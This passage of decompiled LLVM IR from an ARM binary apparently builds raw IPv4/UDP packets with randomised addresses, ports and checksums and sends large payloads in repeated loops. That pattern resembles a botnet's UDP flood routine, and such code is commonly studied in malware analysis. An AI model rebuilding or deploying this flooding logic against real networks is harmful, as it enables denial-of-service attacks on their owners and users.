  store i1 %v7_d8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8e0, label %dec_label_pc_dc60, label %dec_label_pc_d8e8

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d8c0
  %v0_d8e8 = load i32, i32* @r4, align 4
  %v3_d8e8 = mul i32 %v0_d8e8, 65536
  store i32 %v3_d8e8, i32* @lr, align 4
  %v0_d8ec = load i32, i32* @r7, align 4
  %v0_d8f0 = load i32, i32* @r6, align 4
  %v3_d8f0 = mul i32 %v0_d8f0, 65536
  store i32 %v3_d8f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d8f8 = urem i32 %v0_d8ec, 65536
  %v3_d8fc = urem i32 %v0_d8f0, 65536
  store i32 %v3_d8fc, i32* %r2.global-to-local, align 4
  %v3_d900 = urem i32 %v0_d8e8, 65536
  store i32 %v3_d900, i32* %r3.global-to-local, align 4
  %v0_d904 = load i32, i32* %sb.global-to-local, align 4
  %v2_d904 = icmp eq i32 %v0_d904, 0
  store i1 %v2_d904, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp50 = icmp slt i32 %v0_d904, 1
  br i1 %tmp50, label %dec_label_pc_da88, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d8e8
  %v1_d920 = urem i32 %v0_d8e8, 256
  %v1_d924 = urem i32 %v0_d8ec, 256
  %v3_d928 = mul nuw nsw i32 %v1_d920, 256
  %v1_d92c = urem i32 %v0_d8f0, 256
  %tmp51 = udiv i32 %v0_d8ec, 256
  %v3_d930 = urem i32 %tmp51, 256
  %tmp52 = udiv i32 %v0_d8f0, 256
  %v3_d934 = urem i32 %tmp52, 256
  store i32 %v3_d934, i32* %ip.global-to-local, align 4
  %v4_d938 = mul nuw nsw i32 %v1_d924, 256
  %v5_d938 = or i32 %v4_d938, %v3_d930
  store i32 %v5_d938, i32* @r7, align 4
  %v4_d93c = mul nuw nsw i32 %v1_d92c, 256
  %v5_d93c = or i32 %v4_d93c, %v3_d934
  store i32 %v5_d93c, i32* @r6, align 4
  %tmp53 = udiv i32 %v0_d8e8, 256
  %v4_d940 = urem i32 %tmp53, 256
  %v5_d940 = or i32 %v4_d940, %v3_d928
  store i32 %v5_d940, i32* @r5, align 4
  store i32 %v1_d92c, i32* %r2.global-to-local, align 4
  store i32 %v1_d920, i32* %r3.global-to-local, align 4
  %v2_d9bc = icmp eq i32 %v1_d850, 0
  %v4_d9c0 = sext i8 %v5_d840 to i32
  %sext = mul i32 %v0_d8ec, 16777216
  %v4_d9dc = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v0_d8f0, 16777216
  %v4_da38 = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_d8e8, 16777216
  %v4_da58 = sdiv i32 %sext7, 16777216
  br label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb57, %dec_label_pc_d91c
  %v2_d964 = call i32 @function_14254(i32 128, i32 1)
  store i32 %v2_d7d0, i32* %r2.global-to-local, align 4
  %v3_d96c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d96c, i32* %r3.global-to-local, align 4
  %v2_d970 = load i32, i32* @r4, align 4
  %v5_d970 = mul i32 %v2_d970, 4
  %v6_d970 = add i32 %v5_d970, %v2_d7d0
  %v7_d970 = inttoptr i32 %v6_d970 to i32*
  store i32 %v2_d964, i32* %v7_d970, align 4
  %v0_d974 = load i32, i32* %r2.global-to-local, align 4
  %v1_d974 = load i32, i32* %r3.global-to-local, align 4
  %v4_d974 = mul i32 %v1_d974, 4
  %v5_d974 = add i32 %v4_d974, %v0_d974
  %v6_d974 = inttoptr i32 %v5_d974 to i32*
  %v7_d974 = load i32, i32* %v6_d974, align 4
  store i32 %v7_d974, i32* @lr, align 4
  %v1_d978 = inttoptr i32 %v7_d974 to i8*
  %v2_d978 = load i8, i8* %v1_d978, align 1
  %tmp = urem i8 %v2_d978, 16
  %v1_d97c = zext i8 %tmp to i32
  %v1_d980 = or i32 %v1_d97c, 64
  store i32 %v1_d980, i32* %r3.global-to-local, align 4
  %v1_d984 = trunc i32 %v1_d980 to i8
  store i8 %v1_d984, i8* %v1_d978, align 1
  %v0_d988 = load i32, i32* @lr, align 4
  %v1_d988 = inttoptr i32 %v0_d988 to i8*
  %v2_d988 = load i8, i8* %v1_d988, align 1
  %v1_d98c = and i8 %v2_d988, -16
  %v1_d990 = or i8 %v1_d98c, 5
  store i8 %v1_d990, i8* %v1_d988, align 1
  %v2_d99c = load i32, i32* @lr, align 4
  %v3_d99c = add i32 %v2_d99c, 1
  %v4_d99c = inttoptr i32 %v3_d99c to i8*
  store i8 %v5_d808, i8* %v4_d99c, align 1
  %v3_d9a0 = load i32, i32* %stack_var_-44, align 4
  %v1_d9a4 = add i32 %v3_d9a0, 32
  %tmp54 = mul i32 %v1_d9a4, 256
  %v1_d9b0 = and i32 %tmp54, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp55 = udiv i32 %v1_d9a4, 256
  %v4_d9b4 = urem i32 %tmp55, 256
  %v5_d9b4 = or i32 %v4_d9b4, %v1_d9b0
  store i32 %v5_d9b4, i32* %r2.global-to-local, align 4
  store i1 %v2_d9bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_d9c0, i32* %r3.global-to-local, align 4
  %v2_d9c4 = load i32, i32* @lr, align 4
  %v3_d9c4 = add i32 %v2_d9c4, 8
  %v4_d9c4 = inttoptr i32 %v3_d9c4 to i8*
  store i8 %v5_d840, i8* %v4_d9c4, align 1
  %v0_d9c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d95c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d9cc = load i32, i32* @lr, align 4
  %v4_d9cc = add i32 %v3_d9cc, 6
  %v5_d9cc = inttoptr i32 %v4_d9cc to i8*
  store i8 64, i8* %v5_d9cc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d95c, %bb
  %v0_d9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9d0 = trunc i32 %v0_d9d0 to i8
  %v2_d9d0 = load i32, i32* @lr, align 4
  %v3_d9d0 = add i32 %v2_d9d0, 2
  %v4_d9d0 = inttoptr i32 %v3_d9d0 to i8*
  store i8 %v1_d9d0, i8* %v4_d9d0, align 1
  %v0_d9d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d9d4 = sdiv i32 %v0_d9d4, 256
  store i32 %v3_d9d4, i32* %ip.global-to-local, align 4
  store i32 %v4_d9dc, i32* %r2.global-to-local, align 4
  %v2_d9e0 = load i32, i32* @lr, align 4
  %v3_d9e0 = add i32 %v2_d9e0, 9
  %v4_d9e0 = inttoptr i32 %v3_d9e0 to i8*
  store i8 17, i8* %v4_d9e0, align 1
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* %r3.global-to-local, align 4
  %v0_d9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9e8 = trunc i32 %v0_d9e8 to i8
  %v2_d9e8 = load i32, i32* @lr, align 4
  %v3_d9e8 = add i32 %v2_d9e8, 5
  %v4_d9e8 = inttoptr i32 %v3_d9e8 to i8*
  store i8 %v1_d9e8, i8* %v4_d9e8, align 1
  %v0_d9ec = load i32, i32* %ip.global-to-local, align 4
  %v1_d9ec = trunc i32 %v0_d9ec to i8
  %v2_d9ec = load i32, i32* @lr, align 4
  %v3_d9ec = add i32 %v2_d9ec, 3
  %v4_d9ec = inttoptr i32 %v3_d9ec to i8*
  store i8 %v1_d9ec, i8* %v4_d9ec, align 1
  %v0_d9f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9f0, label %.thread8, label %bb56

.thread8:                                         ; preds = %.thread
  %v3_d9f49 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f49, i32* %ip.global-to-local, align 4
  br label %bb57

bb56:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f4, i32* %ip.global-to-local, align 4
  %v3_d9f8 = load i32, i32* @lr, align 4
  %v4_d9f8 = add i32 %v3_d9f8, 7
  %v5_d9f8 = inttoptr i32 %v4_d9f8 to i8*
  store i8 0, i8* %v5_d9f8, align 1
  %v0_da00.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %bb56
  %v0_da00 = phi i32 [ %v3_d9f49, %.thread8 ], [ %v0_da00.pre, %bb56 ]
  %v2_d9fc = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_d9fc, i32* %r2.global-to-local, align 4
  %v3_da00 = mul i32 %v0_da00, 32
  store i32 %v3_da00, i32* %r3.global-to-local, align 4
  %v1_da04 = load i32, i32* @lr, align 4
  %v2_da04 = add i32 %v1_da04, 12
  %v3_da04 = inttoptr i32 %v2_da04 to i32*
  store i32 %v2_d9fc, i32* %v3_da04, align 4
  %v0_da08 = load i32, i32* %r3.global-to-local, align 4
  %v1_da08 = load i32, i32* %ip.global-to-local, align 4
  %tmp60 = mul i32 %v1_da08, -8
  %v5_da08 = add i32 %v0_da08, %tmp60
  %v1_da0c = load i32, i32* @sl, align 4
  %v2_da0c = add i32 %v5_da08, %v1_da0c
  store i32 %v2_da0c, i32* %r3.global-to-local, align 4
  %v1_da10 = add i32 %v2_da0c, 16
  %v2_da10 = inttoptr i32 %v1_da10 to i32*
  %v3_da10 = load i32, i32* %v2_da10, align 4
  %v1_da14 = load i32, i32* @lr, align 4
  %v2_da14 = add i32 %v1_da14, 16
  %v3_da14 = inttoptr i32 %v2_da14 to i32*
  store i32 %v3_da10, i32* %v3_da14, align 4
  %v3_da18 = load i32, i32* %stack_var_-44, align 4
  %v1_da1c = add i32 %v3_da18, 12
  %tmp58 = mul i32 %v1_da1c, 256
  %v1_da2c = and i32 %tmp58, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp59 = udiv i32 %v1_da1c, 256
  %v4_da30 = urem i32 %tmp59, 256
  %v5_da30 = or i32 %v4_da30, %v1_da2c
  store i32 %v5_da30, i32* %ip.global-to-local, align 4
  %v1_da34 = load i32, i32* @lr, align 4
  %v2_da34 = add i32 %v1_da34, 28
  %v3_da34 = inttoptr i32 %v2_da34 to i32*
  store i32 -1, i32* %v3_da34, align 4
  store i32 %v4_da38, i32* %r2.global-to-local, align 4
  %v0_da3c = load i32, i32* @lr, align 4
  %v1_da3c = add i32 %v0_da3c, 20
  store i32 %v1_da3c, i32* %r4.global-to-local, align 4
  %v0_da40 = load i32, i32* %ip.global-to-local, align 4
  %v3_da40 = sdiv i32 %v0_da40, 256
  store i32 %v3_da40, i32* %r3.global-to-local, align 4
  %v0_da44 = load i32, i32* @r7, align 4
  %v1_da44 = trunc i32 %v0_da44 to i8
  %v3_da44 = add i32 %v0_da3c, 4
  %v4_da44 = inttoptr i32 %v3_da44 to i8*
  store i8 %v1_da44, i8* %v4_da44, align 1
  %v0_da48 = load i32, i32* @r6, align 4
  %v1_da48 = trunc i32 %v0_da48 to i8
  %v2_da48 = load i32, i32* @lr, align 4
  %v3_da48 = add i32 %v2_da48, 20
  %v4_da48 = inttoptr i32 %v3_da48 to i8*
  store i8 %v1_da48, i8* %v4_da48, align 1
  %v0_da4c = load i32, i32* %r3.global-to-local, align 4
  %v1_da4c = trunc i32 %v0_da4c to i8
  %v2_da4c = load i32, i32* %r4.global-to-local, align 4
  %v3_da4c = add i32 %v2_da4c, 5
  %v4_da4c = inttoptr i32 %v3_da4c to i8*
  store i8 %v1_da4c, i8* %v4_da4c, align 1
  %v0_da50 = load i32, i32* @r5, align 4
  %v1_da50 = trunc i32 %v0_da50 to i8
  %v2_da50 = load i32, i32* %r4.global-to-local, align 4
  %v3_da50 = add i32 %v2_da50, 2
  %v4_da50 = inttoptr i32 %v3_da50 to i8*
  store i8 %v1_da50, i8* %v4_da50, align 1
  %v0_da54 = load i32, i32* %r2.global-to-local, align 4
  %v1_da54 = trunc i32 %v0_da54 to i8
  %v2_da54 = load i32, i32* %r4.global-to-local, align 4
  %v3_da54 = add i32 %v2_da54, 1
  %v4_da54 = inttoptr i32 %v3_da54 to i8*
  store i8 %v1_da54, i8* %v4_da54, align 1
  store i32 %v4_da58, i32* %r3.global-to-local, align 4
  %v0_da5c = load i32, i32* %ip.global-to-local, align 4
  %v1_da5c = trunc i32 %v0_da5c to i8
  %v2_da5c = load i32, i32* %r4.global-to-local, align 4
  %v3_da5c = add i32 %v2_da5c, 4
  %v4_da5c = inttoptr i32 %v3_da5c to i8*
  store i8 %v1_da5c, i8* %v4_da5c, align 1
  %v0_da60 = load i32, i32* %r3.global-to-local, align 4
  %v1_da60 = trunc i32 %v0_da60 to i8
  %v2_da60 = load i32, i32* %r4.global-to-local, align 4
  %v3_da60 = add i32 %v2_da60, 3
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i32, i32* %r8.global-to-local, align 4
  %v0_da68 = load i32, i32* @lr, align 4
  %v1_da68 = add i32 %v0_da68, 32
  %v3_da6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da6c, i32* %r2.global-to-local, align 4
  %v3_da70 = call i32 @function_12d10(i32 %v1_da68, i32 %v0_da64, i32 %v3_da6c)
  %v3_da74 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da74, i32* %r3.global-to-local, align 4
  %v1_da78 = add i32 %v3_da74, 1
  store i32 %v1_da78, i32* @r4, align 4
  %v1_da7c = load i32, i32* %sb.global-to-local, align 4
  %v9_da7c = icmp eq i32 %v1_da78, %v1_da7c
  store i1 %v9_da7c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_da78, i32* %stack_var_-40, align 4
  %v5_da84 = icmp slt i32 %v1_da78, %v1_da7c
  br i1 %v5_da84, label %dec_label_pc_d95c, label %dec_label_pc_da88

dec_label_pc_da88:                                ; preds = %bb57, %dec_label_pc_d8e8
  %v0_da88 = phi i32 [ %v0_d904, %dec_label_pc_d8e8 ], [ %v1_da7c, %bb57 ]
  %v2_da88 = icmp eq i32 %v0_da88, 0
  store i1 %v2_da88, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dad0 = icmp eq i32 %v3_d8f8, 65535
  br label %dec_label_pc_da90.outer

dec_label_pc_da90.outer:                          ; preds = %dec_label_pc_dba0, %dec_label_pc_da88
  %v1_da90.ph.in = phi i32 [ %v1_db94, %dec_label_pc_dba0 ], [ %v0_da88, %dec_label_pc_da88 ]
  %v0_da90.ph = phi i1 [ %v2_dba0, %dec_label_pc_dba0 ], [ %v2_da88, %dec_label_pc_da88 ]
  %v1_da90.ph = icmp slt i32 %v1_da90.ph.in, 0
  %v4_da90 = or i1 %v1_da90.ph, %v0_da90.ph
  br label %dec_label_pc_da90

dec_label_pc_da90:                                ; preds = %dec_label_pc_da90.outer, %dec_label_pc_da90
  br i1 %v4_da90, label %dec_label_pc_da90, label %dec_label_pc_da94

dec_label_pc_da94:                                ; preds = %dec_label_pc_da90
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_daa0

dec_label_pc_daa0:                                ; preds = %dec_label_pc_daf0, %dec_label_pc_da94
  %v1_dab4 = phi i32 [ %v1_db90, %dec_label_pc_daf0 ], [ 0, %dec_label_pc_da94 ]
  %v5_daa4 = mul i32 %v1_dab4, 24
  %v1_daa8 = load i32, i32* @sl, align 4
  %v2_daa8 = add i32 %v1_daa8, %v5_daa4
  store i32 %v2_daa8, i32* %r3.global-to-local, align 4
  %v1_dab0 = add i32 %v2_daa8, 20
  %v2_dab0 = inttoptr i32 %v1_dab0 to i8*
  %v3_dab0 = load i8, i8* %v2_dab0, align 1
  %v4_dab0 = zext i8 %v3_dab0 to i32
  store i32 %v4_dab0, i32* %r2.global-to-local, align 4
  %v4_dab4 = mul i32 %v1_dab4, 4
  %v5_dab4 = add i32 %v4_dab4, %v2_d7d0
  %v6_dab4 = inttoptr i32 %v5_dab4 to i32*
  %v7_dab4 = load i32, i32* %v6_dab4, align 4
  store i32 %v7_dab4, i32* @r5, align 4
  %v7_dabc = icmp eq i8 %v3_dab0, 31
  store i1 %v7_dabc, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_dac4 = add i32 %v7_dab4, 20
  store i32 %v1_dac4, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_dab0, 32
  br i1 %tmp61, label %dec_label_pc_dbac, label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daa0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  store i1 %v3_dad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dad0, label %dec_label_pc_dc14, label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge, %dec_label_pc_dacc
  %v1_dadc = phi i32 [ %v1_dadc.pre, %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge ], [ 65535, %dec_label_pc_dacc ]
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v9_dadc = icmp eq i32 %v3_d8fc, %v1_dadc
  store i1 %v9_dadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dadc, label %dec_label_pc_dc30, label %dec_label_pc_dae4

dec_label_pc_dae4:                                ; preds = %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge, %dec_label_pc_dad8
  %v1_dae8 = phi i32 [ %v1_dae8.pre, %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge ], [ %v1_dadc, %dec_label_pc_dad8 ]
  %v9_dae8 = icmp eq i32 %v3_d900, %v1_dae8
  store i1 %v9_dae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dae8, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4, %dec_label_pc_dc4c
  %v0_daf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  %v2_daf4 = load i32, i32* @r5, align 4
  %v3_daf4 = add i32 %v2_daf4, 10
  %v4_daf4 = inttoptr i32 %v3_daf4 to i8*
  store i8 %v1_daf4, i8* %v4_daf4, align 1
  %v0_daf8 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf8 = trunc i32 %v0_daf8 to i8
  %v2_daf8 = load i32, i32* @r5, align 4
  %v3_daf8 = add i32 %v2_daf8, 11
  %v4_daf8 = inttoptr i32 %v3_daf8 to i8*
  store i8 %v1_daf8, i8* %v4_daf8, align 1
  %v0_dafc = load i32, i32* @r5, align 4
  store i32 %v0_dafc, i32* @r0, align 4
  %v2_db00 = call i32 @function_e424(i32 %v0_dafc, i32 20)
  %v3_db00 = trunc i32 %v2_db00 to i8
  %v4_db04 = sdiv i32 %v2_db00, 256
  store i32 %v4_db04, i32* %r3.global-to-local, align 4
  %v1_db08 = trunc i32 %v4_db04 to i8
  %v2_db08 = load i32, i32* @r5, align 4
  %v3_db08 = add i32 %v2_db08, 11
  %v4_db08 = inttoptr i32 %v3_db08 to i8*
  store i8 %v1_db08, i8* %v4_db08, align 1
  %v3_db0c = load i32, i32* @r5, align 4
  %v4_db0c = add i32 %v3_db0c, 10
  %v5_db0c = inttoptr i32 %v4_db0c to i8*
  store i8 %v3_db00, i8* %v5_db0c, align 1
  %v0_db10 = load i32, i32* %r8.global-to-local, align 4
  %v1_db10 = trunc i32 %v0_db10 to i8
  %v2_db10 = load i32, i32* @r6, align 4
  %v3_db10 = add i32 %v2_db10, 6
  %v4_db10 = inttoptr i32 %v3_db10 to i8*
  store i8 %v1_db10, i8* %v4_db10, align 1
  %v0_db14 = load i32, i32* %r8.global-to-local, align 4
  %v1_db14 = trunc i32 %v0_db14 to i8
  %v2_db14 = load i32, i32* @r6, align 4
  %v3_db14 = add i32 %v2_db14, 7
  %v4_db14 = inttoptr i32 %v3_db14 to i8*
  store i8 %v1_db14, i8* %v4_db14, align 1
  %v0_db18 = load i32, i32* @r5, align 4
  %v1_db18 = add i32 %v0_db18, 24
  %v2_db18 = inttoptr i32 %v1_db18 to i8*
  %v3_db18 = load i8, i8* %v2_db18, align 1
  %v4_db18 = zext i8 %v3_db18 to i32
  store i32 %v4_db18, i32* %r3.global-to-local, align 4
  %v1_db1c = add i32 %v0_db18, 25
  %v2_db1c = inttoptr i32 %v1_db1c to i8*
  %v3_db1c = load i8, i8* %v2_db1c, align 1
  %v4_db1c = zext i8 %v3_db1c to i32
  %v4_db20 = mul nuw nsw i32 %v4_db1c, 256
  %v5_db20 = or i32 %v4_db20, %v4_db18
  store i32 %v5_db20, i32* %r2.global-to-local, align 4
  %v3_db24 = load i32, i32* %stack_var_-44, align 4
  %v0_db28 = load i32, i32* @r6, align 4
  store i32 %v0_db28, i32* @r1, align 4
  %v1_db2c = add i32 %v3_db24, 12
  store i32 %v1_db2c, i32* %r3.global-to-local, align 4
  %v4_db34 = call i32 @function_e480(i32 %v0_db18, i32 %v0_db28, i32 %v5_db20, i32 %v1_db2c)
  %v5_db34 = trunc i32 %v4_db34 to i8
  %v4_db3824 = udiv i32 %v4_db34, 256
  %v1_db3c = trunc i32 %v4_db3824 to i8
  %v2_db3c = load i32, i32* @r6, align 4
  %v3_db3c = add i32 %v2_db3c, 7
  %v4_db3c = inttoptr i32 %v3_db3c to i8*
  store i8 %v1_db3c, i8* %v4_db3c, align 1
  %v3_db40 = load i32, i32* @r6, align 4
  %v4_db40 = add i32 %v3_db40, 6
  %v5_db40 = inttoptr i32 %v4_db40 to i8*
  store i8 %v5_db34, i8* %v5_db40, align 1
  %v3_db44 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db44, i32* %r3.global-to-local, align 4
  %v0_db48 = load i32, i32* @r5, align 4
  %v1_db48 = add i32 %v0_db48, 20
  %v2_db48 = inttoptr i32 %v1_db48 to i32*
  %v3_db48 = load i32, i32* %v2_db48, align 4
  %v5_db50 = mul i32 %v3_db44, 24
  %v1_db54 = load i32, i32* @sl, align 4
  %v2_db54 = add i32 %v1_db54, %v5_db50
  store i32 %v2_db54, i32* %ip.global-to-local, align 4
  %v3_db58 = udiv i32 %v3_db48, 65536
  store i32 %v3_db58, i32* %r2.global-to-local, align 4
  %v1_db5c = trunc i32 %v3_db58 to i8
  %v3_db5c = add i32 %v2_db54, 2
  %v4_db5c = inttoptr i32 %v3_db5c to i8*
  store i8 %v1_db5c, i8* %v4_db5c, align 1
  %v0_db60 = load i32, i32* %r2.global-to-local, align 4
  %v3_db6025 = udiv i32 %v0_db60, 256
  %v3_db64 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_db64, i32* %r2.global-to-local, align 4
  %v1_db68 = trunc i32 %v3_db6025 to i8
  %v2_db68 = load i32, i32* %ip.global-to-local, align 4
  %v3_db68 = add i32 %v2_db68, 3
  %v4_db68 = inttoptr i32 %v3_db68 to i8*
  store i8 %v1_db68, i8* %v4_db68, align 1
  %v0_db6c = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_db74 = load i32, i32* %r2.global-to-local, align 4
  %v1_db74 = add i32 %v0_db74, 32
  store i32 %v1_db74, i32* %r2.global-to-local, align 4
  %v0_db78 = load i32, i32* %fp.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_db80 = load i32, i32* %ip.global-to-local, align 4
  %v6_db88 = inttoptr i32 %v0_db6c to i32*
  %v7_db88 = call i32 @function_13eec(i32 %v0_db78, i32* %v6_db88, i32 %v1_db74, i32 16384, i32 %v0_db80, i32 16)
  %v3_db8c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db8c, i32* %r3.global-to-local, align 4
  %v1_db90 = add i32 %v3_db8c, 1
  %v1_db94 = load i32, i32* %sb.global-to-local, align 4
  %v9_db94 = icmp eq i32 %v1_db90, %v1_db94
  store i1 %v9_db94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_db90, i32* %stack_var_-40, align 4
  %v5_db9c = icmp slt i32 %v1_db90, %v1_db94
  br i1 %v5_db9c, label %dec_label_pc_daa0, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_daf0
  %v2_dba0 = icmp eq i32 %v1_db94, 0
  store i1 %v2_dba0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da90.outer

dec_label_pc_dbac:                                ; preds = %dec_label_pc_daa0
  %v1_dbac = add i32 %v2_daa8, 16
  %v2_dbac = inttoptr i32 %v1_dbac to i32*
  %v3_dbac = load i32, i32* %v2_dbac, align 4
  store i32 %v3_dbac, i32* @r4, align 4
  %v0_dbb0 = call i32 @function_fe60()
  %v3_dbb4 = load i32, i32* %stack_var_-40, align 4
  %v5_dbbc = mul i32 %v3_dbb4, 24
  %v0_dbc0 = load i32, i32* @r4, align 4
  %v1_dbc4 = and i32 %v0_dbc0, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_dbc4, i32* %r3.global-to-local, align 4
  %v1_dbc0 = udiv i32 %v0_dbc0, 256
  %v3_dbc8 = and i32 %v1_dbc0, 65280
  store i32 %v3_dbc8, i32* %r2.global-to-local, align 4
  %v1_dbcc = load i32, i32* @sl, align 4
  %v2_dbcc = add i32 %v1_dbcc, %v5_dbbc
  store i32 %v2_dbcc, i32* %ip.global-to-local, align 4
  %v3_dbd0 = mul i32 %v0_dbc0, 16777216
  %v4_dbd4 = mul i32 %v1_dbc4, 256
  %v5_dbd4 = or i32 %v4_dbd4, %v3_dbd0
  %v1_dbd8 = add i32 %v2_dbcc, 20
  %v2_dbd8 = inttoptr i32 %v1_dbd8 to i8*
  %v3_dbd8 = load i8, i8* %v2_dbd8, align 1
  %v4_dbd8 = zext i8 %v3_dbd8 to i32
  %v4_dbdc = udiv i32 %v0_dbc0, 16777216
  %v5_dbdc = or i32 %v3_dbc8, %v4_dbdc
  %v2_dbe0 = or i32 %v5_dbdc, %v5_dbd4
  %v7_dbe4 = lshr i32 %v0_dbb0, %v4_dbd8
  %v8_dbe4 = add i32 %v7_dbe4, %v2_dbe0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  %v2_dc04 = call i32 @llvm.bswap.i32(i32 %v8_dbe4)
  store i32 %v2_dc04, i32* %r3.global-to-local, align 4
  %v1_dc08 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc08 = icmp eq i32 %v3_d8f8, %v1_dc08
  store i1 %v9_dc08, i1* %cpsr_z.global-to-local, align 1
  %v1_dc0c = load i32, i32* @r5, align 4
  %v2_dc0c = add i32 %v1_dc0c, 16
  %v3_dc0c = inttoptr i32 %v2_dc0c to i32*
  store i32 %v2_dc04, i32* %v3_dc0c, align 4
  br i1 %v9_dc08, label %dec_label_pc_dc14, label %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge

dec_label_pc_dbac.dec_label_pc_dad8_crit_edge:    ; preds = %dec_label_pc_dbac
  %v1_dadc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dad8

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_dacc
  %v0_dc14 = call i32 @function_fe60()
  %v1_dc14 = trunc i32 %v0_dc14 to i8
  %v4_dc1826 = udiv i32 %v0_dc14, 256
  %v1_dc1c = trunc i32 %v4_dc1826 to i8
  %v2_dc1c = load i32, i32* @r5, align 4
  %v3_dc1c = add i32 %v2_dc1c, 5
  %v4_dc1c = inttoptr i32 %v3_dc1c to i8*
  store i8 %v1_dc1c, i8* %v4_dc1c, align 1
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v1_dc24 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc24 = icmp eq i32 %v3_d8fc, %v1_dc24
  store i1 %v9_dc24, i1* %cpsr_z.global-to-local, align 1
  %v3_dc28 = load i32, i32* @r5, align 4
  %v4_dc28 = add i32 %v3_dc28, 4
  %v5_dc28 = inttoptr i32 %v4_dc28 to i8*
  store i8 %v1_dc14, i8* %v5_dc28, align 1
  %v0_dc2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc2c, label %dec_label_pc_dc30, label %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge

dec_label_pc_dc14.dec_label_pc_dae4_crit_edge:    ; preds = %dec_label_pc_dc14
  %v1_dae8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dae4

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_dad8
  %v0_dc30 = call i32 @function_fe60()
  %v1_dc30 = trunc i32 %v0_dc30 to i8
  %v4_dc38 = sdiv i32 %v0_dc30, 256
  store i32 %v4_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r7.global-to-local, align 4
  %v9_dc3c = icmp eq i32 %v3_d900, %v1_dc3c
  store i1 %v9_dc3c, i1* %cpsr_z.global-to-local, align 1
  %v3_dc40 = load i32, i32* @r5, align 4
  %v4_dc40 = add i32 %v3_dc40, 20
  %v5_dc40 = inttoptr i32 %v4_dc40 to i8*
  store i8 %v1_dc30, i8* %v5_dc40, align 1
  %v0_dc44 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc44 = trunc i32 %v0_dc44 to i8
  %v2_dc44 = load i32, i32* @r6, align 4
  %v3_dc44 = add i32 %v2_dc44, 1
